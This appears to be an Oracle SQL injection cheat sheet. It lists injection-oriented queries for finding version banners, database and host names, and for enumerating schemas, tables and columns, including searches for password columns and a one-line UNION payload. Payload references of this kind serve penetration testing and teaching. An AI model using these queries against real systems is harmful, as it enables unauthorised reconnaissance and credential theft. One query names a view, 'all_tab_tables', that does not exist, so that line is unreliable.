# Oracle SQL Injection

## Summary

* [Oracle SQL comment](#oracle-sql-comment)
* [Oracle SQL version](#oracle-sql-version)
* [Oracle SQL database name](#oracle-sql-database-name)
* [Oracle SQL List databases](#oracle-sql-list-databases)
* [Oracle SQL List columns](#oracle-sql-list-columns)
* [Oracle SQL List tables](#oracle-sql-list-tables)


## Oracle SQL comment

```sql

--  	SQL comment

```

## Oracle SQL version

```sql
SELECT user FROM dual UNION SELECT * FROM v$version
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
SELECT version FROM v$instance;
------------------------------------------------------
Notes:
All SELECT statements in Oracle must contain a table.
dual is a dummy table which can be used for testing.
```

## Oracle SQL database name

```sql
SELECT global_name FROM global_name;
SELECT name FROM V$DATABASE;
SELECT instance_name FROM V$INSTANCE;
SELECT SYS.DATABASE_NAME FROM DUAL;
------------------------------------------------------
Current Database
SELECT name FROM v$database;
SELECT instance_name FROM v$instance
SELECT global_name FROM global_name
SELECT SYS.DATABASE_NAME FROM DUAL
------------------------------------------------------
User Databases
SELECT DISTINCT owner FROM all_tables;
------------------------------------------------------
Server Hostname
SELECT host_name FROM v$instance; (Privileged)
SELECT UTL_INADDR.get_host_name FROM dual;
SELECT UTL_INADDR.get_host_address FROM dual;
```

## Oracle SQL List Databases

```sql
SELECT DISTINCT owner FROM all_tables;
------------------------------------------------------
Default Databases
SYSTEM	Available in all versions
SYSAUX	Available in all versions

```

## Oracle SQL List Columns

```sql
SELECT column_name FROM all_tab_columns WHERE table_name = '';
SELECT column_name FROM all_tab_columns WHERE table_name = '' and owner = '';
------------------------------------------------------
Retrieving Columns
SELECT column_name FROM all_tab_columns;
SELECT table_name FROM all_tab_tables WHERE column_name = 'password';

```

## Oracle SQL List Tables

```sql
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
------------------------------------------------------
Find Tables from Column Name
SELECT column_name FROM all_tab_columns WHERE table_name = 'Users';
------------------------------------------------------
Retrieving Multiple Tables at once
SELECT RTRIM(XMLAGG(XMLELEMENT(e, table_name || ',')).EXTRACT('//text()').EXTRACT('//text()') ,',') FROM all_tables;

```

